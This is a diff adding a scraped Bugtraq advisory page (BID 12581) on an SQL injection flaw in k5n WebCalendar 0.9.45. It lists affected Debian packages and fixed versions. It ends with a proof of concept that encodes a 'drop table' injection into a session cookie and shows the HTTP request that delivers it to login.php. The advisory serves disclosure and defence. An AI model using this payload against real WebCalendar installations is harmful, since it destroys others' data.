@@ -1,0 +1,238 @@
+#SpeeDr00t@Black Falcon<br>#bid12581<p><b><span style="font-size: 18pt;">WebCalendar SQL Injection Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/12581/info">info</a><br><a href="http://www.securityfocus.com/bid/12581/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/12581/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/12581/solution">solution</a><br><a href="http://www.securityfocus.com/bid/12581/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				12581
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 17 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Feb 17 2005 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Discovery of this vulnerability is credited to Michael Scovetta of Scovetta Labs.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					k5n WebCalendar 0.9.45 <br/>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  sparc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  s/390<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  s/390<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  ppc<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  mipsel<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  mipsel<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  mips<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  mips<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  m68k<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  m68k<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  ia-64<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  ia-64<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  ia-32<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  ia-32<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  hppa<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  hppa<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  arm<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  arm<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1  alpha<br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1 <br/>
+</span>
+<span class="related">
+						
+							-
+						
+						Debian Linux 3.1 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					k5n WebCalendar 1.0 rc2<br/>
+					
+				
+					k5n WebCalendar 1.0 RC1<br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	No exploit is required.<br/><br/>The following proof of concept is available:<br/>&lt;?php<br/>   include_once 'includes/init.php';<br/>   echo encode_string("'; drop table foo; select 'a|zzabcdefg");<br/> ?&gt;<br/><br/> output: <br/>   7c8c3a738e858f4199b6b386743c7c8e906075c47f7b817993414cb6cd94897d7882858abbb8<br/><br/> attack payload:<br/>   telnet example.com<br/>   GET /login.php HTTP/1.1<br/>   Cookie: webcalendar_session=7c8c3a738e858f4199b6b386743c7c8e906075c47f7b817993414cb6cd94897d7882858abbb8
+	
+		<ul>
+</ul>
+</div>
